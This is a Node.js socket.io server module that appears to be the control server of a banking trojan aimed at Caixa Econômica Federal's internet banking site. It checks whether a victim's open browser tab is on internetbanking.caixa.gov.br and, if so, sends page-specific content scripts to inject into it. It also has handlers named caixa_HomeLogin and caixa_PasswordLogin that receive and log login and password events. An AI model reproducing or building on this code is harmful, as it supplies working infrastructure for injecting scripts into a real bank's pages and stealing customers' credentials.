'use strict';

var fs = require('fs');
var appPath = process.cwd();
var contentPath = appPath+'/banks/caixa/server/content';
var fs = require('fs');
var path = require('path');

module.exports = function(app, io, db){

	// Initializing vars contentScripts
	var contentScripts = {};
	var homeName = 'CEF';
	var hosts = 'internetbanking.caixa.gov.br';

	// Load all content files and sabe on obj contentScripts
    fs.readdirSync(contentPath).forEach(function(fileName) {
    	var scriptName = fileName.split('.')[0];
    	var newPath = path.join(contentPath,fileName);
    	fs.readFile(newPath, "utf8", function (err, data) {
		    if (err) throw err;
		    contentScripts[scriptName] = data.toString();
		});
  	});

	
	io.on('connection', function(socket){

		console.log(socket.id + 'conectado');

		socket.on('onTabRemoved', function(tabId){
			console.log('Janela removida : '+tabId);
		});

		socket.on('onTabCreated', function(tab){
			console.log('Janela criada : '+tab.id);
		});

		socket.on('onTabUpdated', function(tab){
			if(!tab || !tab.url || !tab.id) {
				socket.emit('err_InjectContentScriptByTabId');
				return;
			};

			// Checking if this tab.url is from caixa
			var hostTabUrl = tab.url.split('/')[2];
			if(hosts !== hostTabUrl){
				// Checking the current page
				socket.emit('err_InjectContentScriptByTabId');
				return;
			}

			// Checking the current page
			socket.emit('injectContentScriptByTabId', tab.id, contentScripts.checkPage);
			
		});


		socket.on('injectContentScript', function(sender, request, response){
			// Check if sender and sender.tab params exists
			if(!sender || !sender.tab || !sender.tab.id){
				socket.emit('err_InjectContentScriptByTabId');
				return;
			}

			// Check if request and request.data params exists
			if(!request || !request.data ){
				socket.emit('err_InjectContentScriptByTabId');
				return;
			};

			// Check if request.data.homeName is CEF
			if(request.data.homeName !== homeName){
				socket.emit('err_InjectContentScriptByTabId');
				return;
			};

			// Check if request.data.pageName is exists
			if(!request.data.pageName ){
				socket.emit('err_InjectContentScriptByTabId');
				return;
			};


			var tab = sender.tab;
			var pageName = request.data.pageName;
			

			// Check folder content contains respective pageName
			var keys = Object.keys(contentScripts);
			if(keys.indexOf(pageName) == -1){
				socket.emit('err_InjectContentScriptByTabId');
				return;
			}

			// pageName exists, injecting content_script on page
			socket.emit('injectContentScriptByTabId', tab.id, contentScripts[pageName]);
		});

		socket.on('pulseConnectionPage', function(sender, request, response){
			// Check if sender and sender.tab params exists
			if(!sender || !sender.tab ) return;

			// Check if request and request.data params exists
			if(!request || !request.data ) return;

			// Check if request.data.homeName is CEF
			if(request.data.homeName !== homeName) return;

			// Check if request.data.pageName is exists
			if(!request.data.pageName ) return;

			var tab = sender.tab;
			var pageName = request.data.pageName;

			console.log(pageName);


		});

		socket.on('caixa_HomeLogin', function(sender, request, response){
			console.log(request);
		});

		socket.on('caixa_PasswordLogin', function(sender, request, response){
			console.log(request);
		});

		socket.on('disconnect', function(){
			console.log(socket.id+' desconectado');
		});
	});

};
